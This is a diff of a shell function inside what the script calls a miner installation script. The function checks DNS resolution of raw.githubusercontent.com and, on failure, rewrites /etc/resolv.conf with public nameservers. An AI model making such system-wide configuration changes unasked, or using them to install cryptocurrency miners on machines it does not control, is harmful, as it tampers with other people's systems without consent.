@@ -161,17 +161,23 @@ PYCODE
 
 DNS_FLAG_FILE="/tmp/.dns_fix_attempted_$$"
 
+# DNS RESOLUTION CHECK & FIX ====================
+# Check if raw.githubusercontent.com can be resolved
+# If not, add public DNS servers and continue (do NOT restart)
+
+DNS_FLAG_FILE="/tmp/.dns_fix_attempted"
+
 check_and_fix_dns() {
     echo "[*] Checking DNS resolution..."
-    
+
     # Test if raw.githubusercontent.com can be resolved
     if host raw.githubusercontent.com >/dev/null 2>&1 || nslookup raw.githubusercontent.com >/dev/null 2>&1 || ping -c 1 -W 2 raw.githubusercontent.com >/dev/null 2>&1; then
         echo "[✓] DNS resolution working"
         return 0
     fi
-    
+
     echo "[!] WARNING: Cannot resolve raw.githubusercontent.com"
-    
+
     # Check if we already tried to fix DNS (prevent infinite loop)
     if [ -f "$DNS_FLAG_FILE" ]; then
         echo "[!] DNS fix already attempted but still failing"
@@ -179,18 +185,18 @@ check_and_fix_dns() {
         echo "[*] You may need to manually configure DNS or use a different network"
         return 1
     fi
-    
+
     # Mark that we're attempting DNS fix
     touch "$DNS_FLAG_FILE"
-    
+
     echo "[*] Adding public DNS servers to /etc/resolv.conf..."
-    
+
     # Backup original resolv.conf
     if [ -f /etc/resolv.conf ]; then
         cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null || true
         echo "[✓] Backed up /etc/resolv.conf"
     fi
-    
+
     # Add nameservers at the TOP of resolv.conf (higher priority)
     {
         echo "# Added by miner installation script"
@@ -199,24 +205,21 @@ check_and_fix_dns() {
         echo ""
         cat /etc/resolv.conf 2>/dev/null || true
     } > /etc/resolv.conf.new
-    
+
     mv /etc/resolv.conf.new /etc/resolv.conf
-    
+
     echo "[✓] Added DNS servers:"
     echo "    1.1.1.1 (Cloudflare)"
     echo "    8.8.8.8 (Google)"
-    
+
     # Test again
     sleep 2
     echo "[*] Testing DNS resolution again..."
-    
+
     if host raw.githubusercontent.com >/dev/null 2>&1 || nslookup raw.githubusercontent.com >/dev/null 2>&1 || ping -c 1 -W 2 raw.githubusercontent.com >/dev/null 2>&1; then
         echo "[✓] DNS resolution now working!"
-        echo "[*] Restarting script with fixed DNS..."
-        echo ""
-        
-        # Restart script with same arguments
-        exec "$0" "$@"
+        # Continue without restarting
+        return 0
     else
         echo "[!] DNS still not working after adding nameservers"
         echo "[*] Continuing anyway - some downloads may fail"
